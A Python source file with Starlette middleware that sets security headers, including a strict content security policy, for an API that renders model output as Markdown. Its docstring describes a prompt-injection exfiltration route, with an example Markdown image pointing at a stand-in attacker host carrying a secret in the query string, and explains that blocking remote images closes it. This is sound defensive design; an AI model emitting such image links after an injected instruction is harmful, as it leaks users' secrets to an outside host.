"""Security response headers (§18, §28).

Defence in depth for the browser-facing surface. The two that matter most here:

- **CSP** — the application renders model output as Markdown. Even with raw HTML
  disabled, a strict policy is the backstop that turns a rendering bug into a
  blocked request instead of script execution.
- **`img-src 'self' data:`** — this is an *exfiltration* control, not an
  aesthetic one. A model persuaded by an injected instruction can emit
  ``![](https://attacker/?d=secret)``; the browser would fetch it and the data
  would leave in the query string. Blocking remote images closes that channel
  (§27.2).
"""

from __future__ import annotations

from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request
from starlette.responses import Response

from app.core.config import get_settings

settings = get_settings()

CSP = "; ".join(
    [
        "default-src 'self'",
        # The API serves JSON and SSE, not pages. Nothing here needs to execute.
        "script-src 'none'",
        "style-src 'self' 'unsafe-inline'",
        "img-src 'self' data:",
        "connect-src 'self'",
        "font-src 'self'",
        "object-src 'none'",
        "base-uri 'none'",
        "frame-ancestors 'none'",
        "form-action 'self'",
    ]
)

_HEADERS = {
    "Content-Security-Policy": CSP,
    "X-Content-Type-Options": "nosniff",
    "X-Frame-Options": "DENY",
    "Referrer-Policy": "no-referrer",
    # Explicitly surrender capabilities this API has no use for.
    "Permissions-Policy": "geolocation=(), microphone=(), camera=(), payment=()",
    "Cross-Origin-Opener-Policy": "same-origin",
    "Cross-Origin-Resource-Policy": "same-origin",
}


class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next) -> Response:
        response = await call_next(request)
        for header, value in _HEADERS.items():
            response.headers.setdefault(header, value)

        # HSTS only over TLS. Sending it on plaintext localhost would pin a
        # developer's browser to https for a host that does not serve it.
        if settings.is_production:
            response.headers.setdefault(
                "Strict-Transport-Security", "max-age=31536000; includeSubDomains"
            )

        # Interactive docs need inline scripts and the Swagger CDN, so the strict
        # policy above would blank the page. Scoped to the two doc routes only,
        # so the relaxation cannot apply to any endpoint that returns data.
        if settings.expose_docs and request.url.path in {"/docs", "/redoc"}:
            response.headers["Content-Security-Policy"] = (
                "default-src 'self' https://cdn.jsdelivr.net; "
                "script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; "
                "style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; "
                "img-src 'self' data: https://fastapi.tiangolo.com"
            )
        return response
